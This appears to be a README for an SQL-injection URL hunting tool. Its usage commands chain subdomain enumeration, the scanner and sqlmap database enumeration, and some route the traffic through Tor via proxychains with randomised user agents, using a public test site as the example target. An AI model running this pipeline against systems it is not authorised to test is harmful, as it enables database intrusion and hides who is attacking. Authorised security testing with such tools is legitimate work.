# SQLscaninjection

Usage Examples
Run without proxychains:

subfinder -d testphp.vulnweb.com -all -silent | python3 sqlihunter.py -o sqliurls.txt -r 1
Run with a file:

python3 sqlihunter.py -f domains.txt -o sqliurls.txt -r 2
Combined with sqlmap:

subfinder -d testphp.vulnweb.com -all -silent | python3 sqlihunter.py -o sqliurls.txt; sqlmap -m sqliurls.txt --batch --dbs --risk 2 --level 5 --random-agent | tee -a sqli.txt
Start Proxychains:

sudo service tor start
Test Proxychains:

proxychains curl -I https://www.google.com
We wait for 200 ok

Run with proxychains:

proxychains subfinder -d testphp.vulnweb.com -all -silent | proxychains python3 sqlihunter.py -o sqliurls.txt -r 1 --use-proxychains

Run with proxychains and combined with sqlmap:
proxychains subfinder -d testphp.vulnweb.com -all -silent | proxychains python3 sqlihunter.py -o sqliurls.txt -r 1 --use-proxychains ; sqlmap -m sqliurls.txt --batch --dbs --risk 2 --level 5 --random-agent | tee -a sqli.txt

